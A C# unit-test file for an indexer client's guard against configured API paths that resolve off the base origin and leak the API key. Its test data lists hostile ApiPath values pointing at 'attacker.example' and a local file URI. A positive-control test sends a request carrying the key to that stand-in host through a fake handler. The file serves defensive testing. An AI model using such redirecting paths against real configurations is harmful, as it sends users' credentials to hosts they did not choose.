using System.Net;
using System.Net.Http.Headers;
using System.Text;
using Arbitarr.Core.Sources;

namespace Arbitarr.Sources.Newznab.Tests;

/// <summary>
/// <c>NewznabSource</c>'s constructor refuses an <c>ApiPath</c> whose RESOLVED endpoint leaves the
/// origin of <c>BaseUrl</c> — see <c>NewznabSource.EnsureEndpointIsOnBaseOrigin</c> for why the
/// <c>TrimStart('/')</c> in <c>EndpointUri</c> is not that defence.
///
/// <para><b>The escaping and the neutralised forms are asserted in ONE theory, per form.</b> The two
/// sets are the same question — "does this ApiPath resolve off-origin?" — and splitting them invites
/// a future edit to widen the guard's refusal onto a form the trim already handles correctly
/// (<c>/api</c> must keep working) or to narrow it off one that escapes. Each form is a separate
/// case, because a theory that passed on one form proves nothing about another: the escapes differ
/// in scheme, in case, in leading whitespace and in carrying userinfo, and <see cref="Uri"/> treats
/// each of those differently.</para>
///
/// <para><b>Non-vacuity (CLAUDE.md §4).</b> An <c>Assert.Throws</c> is not vacuous in the way an
/// absence assertion is, but it still proves nothing about WHAT would have happened without the
/// guard. <see cref="PositiveControl_WithoutTheGuard_AnAbsoluteApiPath_ResolvesOffOrigin_AndTheRequestCarriesTheKeyThere"/>
/// reproduces the unguarded resolution and the outgoing request in-test, so the refusal below is
/// shown to be preventing a real leak rather than rejecting a shape that was never dangerous.</para>
/// </summary>
public class EndpointOriginGuardTests
{
    private const string ApiKey = "placeholder-planted-key";

    private static readonly Uri BaseUrl = new("http://indexer.example:9117/");

    private static NewznabSourceOptions MakeOptions(string apiPath, Uri? baseUrl = null) => new(
        BaseUrl: baseUrl ?? BaseUrl,
        ApiPath: apiPath,
        ApiKey: ApiKey,
        SourceName: "test-indexer",
        RequestTimeout: TimeSpan.FromSeconds(2),
        RateLimitMaxCalls: 1000,
        RateLimitInterval: TimeSpan.FromMilliseconds(1));

    private static NewznabSource Construct(NewznabSourceOptions options, HttpMessageHandler handler) =>
        new(options, new HttpClient(handler), new FakeCircuitBreaker());

    /// <summary>
    /// The six forms the 2026-09-12 security audit accepted as escapes, plus the userinfo form found
    /// in the #339 review, plus the three the trim and <see cref="Uri"/> normalisation already
    /// neutralise. <c>escapes</c> says whether the RESOLVED endpoint leaves the base origin, which is
    /// precisely what the guard asserts on.
    /// </summary>
    public static TheoryData<string, bool> ApiPathForms => new()
    {
        // --- Escapes: new Uri(base, absolute) REPLACES the base. The trim does not touch these.
        { "http://attacker.example/api", true },
        { "https://attacker.example/api", true },          // scheme upgrade
        { " http://attacker.example/api", true },          // leading space; Uri strips it
        { "\thttp://attacker.example/api", true },          // leading tab
        { "HTTP://attacker.example/api", true },           // uppercase scheme
        { "file:///c:/windows/win.ini", true },            // scheme downgrade

        // Matches the base on scheme, host AND port, so ONLY the userinfo clause refuses it: the
        // credentials would ride into the logged request authority, which neither the framework's
        // query-string redaction nor LogMessageCleanser covers.
        { "http://x@indexer.example:9117/api", true },

        // --- Already neutralised: TrimStart('/') demotes the protocol-relative forms to path
        // segments, and Uri flattens the traversal back under the base.
        { "//attacker.example/api", false },
        { "///attacker.example/api", false },
        { "../../../api", false },
    };

    [Theory]
    [MemberData(nameof(ApiPathForms))]
    public void Construction_RefusesAnApiPath_ExactlyWhenItResolvesOffTheBaseOrigin(string apiPath, bool escapes)
    {
        var handler = OkHandler(EmptyFeed);

        if (escapes)
        {
            Assert.Throws<SourceOriginRefusedException>(() => Construct(MakeOptions(apiPath), handler));
        }
        else
        {
            Assert.NotNull(Construct(MakeOptions(apiPath), handler));
        }
    }

    /// <summary>
    /// The refusal message names the source and nothing else. Rendering the resolved endpoint or the
    /// ApiPath would print an attacker-chosen host into the persistent log store at
    /// <c>/api/admin/logs</c>.
    /// </summary>
    [Fact]
    public void TheRefusalMessage_NamesTheSource_AndNeitherTheEndpointNorTheApiPath()
    {
        var apiPath = "http://attacker.example/leaked-path-marker";

        var ex = Assert.Throws<SourceOriginRefusedException>(() => Construct(MakeOptions(apiPath), OkHandler(EmptyFeed)));

        Assert.Contains("test-indexer", ex.Message, StringComparison.Ordinal);
        Assert.DoesNotContain("attacker.example", ex.Message, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("leaked-path-marker", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// <b>Positive control.</b> Reproduces, without the guard, the resolution the guard prevents and
    /// the request that would follow it: the endpoint lands on the foreign host AND carries the
    /// apikey there. Without this the refusal test above would pass just as happily against a guard
    /// that rejected a harmless shape.
    ///
    /// <para>The unguarded resolution is reproduced with <see cref="Uri"/> directly rather than by
    /// keeping a vulnerable overload in the production type — CLAUDE.md §4 forbids putting
    /// vulnerable code in the repository. <c>new Uri(base, path.TrimStart('/'))</c> is exactly
    /// <c>EndpointUri</c>'s body.</para>
    /// </summary>
    [Fact]
    public async Task PositiveControl_WithoutTheGuard_AnAbsoluteApiPath_ResolvesOffOrigin_AndTheRequestCarriesTheKeyThere()
    {
        var apiPath = "http://attacker.example/api";

        // EndpointUri's body, evaluated here instead of on a NewznabSource the guard now refuses to
        // build. The base is replaced outright, despite the trim.
        var unguardedEndpoint = new Uri(BaseUrl, apiPath.TrimStart('/'));
        Assert.Equal("attacker.example", unguardedEndpoint.Host);

        // And a request built on that endpoint carries the key off-origin. Driving a real HttpClient
        // proves the leak is reachable, not merely that a Uri compares unequal.
        var handler = OkHandler(EmptyFeed);
        using var client = new HttpClient(handler);
        var leaking = new UriBuilder(unguardedEndpoint) { Query = "t=caps&apikey=" + Uri.EscapeDataString(ApiKey) }.Uri;
        using var response = await client.GetAsync(leaking);

        var sent = Assert.Single(handler.RequestedUris);
        Assert.Equal("attacker.example", sent.Host);
        Assert.Contains(ApiKey, sent.Query, StringComparison.Ordinal);
    }

    /// <summary>
    /// A same-origin ABSOLUTE ApiPath is ACCEPTED. The guard's contract is "the resolved endpoint
    /// stays on the base origin", not "the ApiPath string is relative": such a path sends the key
    /// only to the host the operator configured, which is the whole property being defended.
    ///
    /// <para>Pinned because it is the decision a reader is most likely to change silently in either
    /// direction. Note it is NOT equivalent to the relative form — being absolute it replaces the
    /// base's path too, so against a reverse-proxied base it lands at the host root rather than
    /// under the proxy prefix. That is the operator's explicit instruction, and it is safe.</para>
    /// </summary>
    [Fact]
    public void ASameOriginAbsoluteApiPath_IsAccepted()
    {
        Assert.NotNull(Construct(MakeOptions("http://indexer.example:9117/api"), OkHandler(EmptyFeed)));
    }

    /// <summary>
    /// Same host and scheme, DIFFERENT port: refused. A guard that compared only the host would
    /// accept this, and the key would go to whatever listens on that port.
    /// </summary>
    [Fact]
    public void ASameHostApiPath_OnADifferentPort_IsRefused()
    {
        Assert.Throws<SourceOriginRefusedException>(
            () => Construct(MakeOptions("http://indexer.example:9999/api"), OkHandler(EmptyFeed)));
    }

    /// <summary>
    /// Same host and port, DIFFERENT scheme: refused. A guard that compared only the host would
    /// accept this too.
    /// </summary>
    [Fact]
    public void ASameHostApiPath_OnADifferentScheme_IsRefused()
    {
        Assert.Throws<SourceOriginRefusedException>(
            () => Construct(MakeOptions("https://indexer.example:9117/api"), OkHandler(EmptyFeed)));
    }

    /// <summary>
    /// <b>The refusal is NOT an <see cref="ArgumentException"/>, and a caller's
    /// <c>catch (ArgumentException)</c> must not swallow it.</b>
    ///
    /// <para>The registry (arb-x7w8.4) builds sources in a loop and naturally writes exactly that
    /// arm to skip a misconfigured row and carry on. Because <see cref="ArgumentNullException"/> IS
    /// an <see cref="ArgumentException"/>, typing the refusal as one would make a SECURITY refusal
    /// indistinguishable from an ordinary bad-argument skip. The <c>catch</c> here is deliberately
    /// the shape that would have swallowed it, so the test fails if the type ever moves back under
    /// that hierarchy.</para>
    /// </summary>
    [Fact]
    public void TheRefusal_IsNotCaught_ByACallersArgumentExceptionArm()
    {
        var escaped = false;

        try
        {
            Construct(MakeOptions("http://attacker.example/api"), OkHandler(EmptyFeed));
        }
        catch (ArgumentException)
        {
            // Reached only if the refusal is (or derives from) ArgumentException.
            escaped = true;
        }
        catch (SourceOriginRefusedException)
        {
            escaped = false;
        }

        Assert.False(escaped);
    }

    /// <summary>
    /// The counterpart to the above: the constructor's NULL guards do still throw
    /// <see cref="ArgumentNullException"/>, so the two are genuinely distinguishable rather than the
    /// previous test passing because nothing throws an <see cref="ArgumentException"/> here at all.
    /// Without this, that test would hold just as well against a constructor with no null guards —
    /// the vacuous shape CLAUDE.md §4 is about.
    /// </summary>
    [Fact]
    public void TheConstructorsNullGuards_StillThrowArgumentNullException_SoTheTwoAreDistinguishable()
    {
        Assert.Throws<ArgumentNullException>(
            () => new NewznabSource(MakeOptions("/api"), new HttpClient(OkHandler(EmptyFeed)), circuitBreaker: null!));
    }

    /// <summary>
    /// An IPv6 base accepts an absolute same-origin ApiPath written in the EXPANDED form against a
    /// COMPRESSED base. <see cref="Uri"/> normalises both host strings to the same compressed text,
    /// so the ordinal host comparison matches and no special-casing is needed — pinned because a
    /// future edit to the comparison (a raw string compare on the original input, say) would break
    /// an operator's IPv6 deployment in a way no other case here would catch.
    /// </summary>
    [Fact]
    public void AnIPv6Base_AcceptsTheSameAddress_WrittenExpandedAgainstACompressedBase()
    {
        var options = MakeOptions(
            "http://[2001:0db8:0000:0000:0000:0000:0000:0001]:9117/api",
            new Uri("http://[2001:db8::1]:9117/"));

        Assert.NotNull(Construct(options, OkHandler(EmptyFeed)));
    }

    /// <summary>
    /// Regression on the behaviour the trim exists for: a leading-slash relative path still resolves
    /// under the base, and the request goes to the configured host.
    /// </summary>
    [Fact]
    public async Task ALeadingSlashRelativeApiPath_StillResolvesOnTheBase()
    {
        var handler = OkHandler(EmptyCaps);
        var source = Construct(MakeOptions("/api"), handler);

        await source.GetCapsAsync(SearchProtocol.Newznab);

        var sent = Assert.Single(handler.RequestedUris);
        Assert.Equal("http://indexer.example:9117/api", sent.GetLeftPart(UriPartial.Path));
    }

    /// <summary>
    /// The reverse-proxied case the trim was written for: a base with a path prefix is APPENDED to,
    /// not replaced, so an indexer relocated to <c>/jackett/</c> is still reached. The guard must not
    /// disturb this.
    /// </summary>
    [Fact]
    public async Task AReverseProxiedBase_IsStillAppendedTo_NotReplaced()
    {
        var handler = OkHandler(EmptyCaps);
        var source = Construct(
            MakeOptions("api/v2.0/indexers/example/results/torznab", new Uri("https://indexer.example/jackett/")),
            handler);

        await source.GetCapsAsync(SearchProtocol.Newznab);

        var sent = Assert.Single(handler.RequestedUris);
        Assert.Equal(
            "https://indexer.example/jackett/api/v2.0/indexers/example/results/torznab",
            sent.GetLeftPart(UriPartial.Path));
    }

    private const string EmptyFeed =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><rss xmlns:torznab=\"http://torznab.com/schemas/2015/feed\"><channel /></rss>";

    private const string EmptyCaps =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><caps><categories /></caps>";

    private static FakeHttpMessageHandler OkHandler(string body) => new(_ => new HttpResponseMessage(HttpStatusCode.OK)
    {
        Content = new StringContent(body, Encoding.UTF8, MediaTypeHeaderValue.Parse("application/xml").MediaType!),
    });
}
